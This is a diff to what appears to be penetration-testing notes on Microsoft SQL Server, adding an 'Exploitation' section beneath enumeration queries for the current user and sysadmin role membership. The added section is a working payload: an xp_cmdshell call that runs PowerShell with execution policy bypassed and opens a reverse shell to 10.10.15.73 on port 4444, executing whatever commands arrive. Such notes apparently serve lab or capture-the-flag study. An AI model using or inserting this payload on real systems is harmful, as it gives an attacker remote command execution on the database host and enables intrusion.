@@ -27,3 +27,27 @@ SELECT SYSTEM_USER;
 # Checking Permissions
 SELECT IS_SRVROLEMEMBER('sysadmin');
 ```
+
+## Exploitation
+```
+
+```
+
+```sql
+EXEC xp_cmdshell 'powershell.exe -ExecutionPolicy Bypass -Command "
+    $client = New-Object System.Net.Sockets.TCPClient(''10.10.15.73'',4444);
+    $stream = $client.GetStream();
+    $bytes = New-Object byte[] 65535;
+
+    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+        $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
+        $sendback = (iex $data 2>&1 | Out-String);
+        $sendback2 = $sendback + ''# '';
+        $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($sendback2);
+        $stream.Write($sendbyte, 0, $sendbyte.Length);
+        $stream.Flush();
+    }
+
+    $client.Close()
+"';
+```
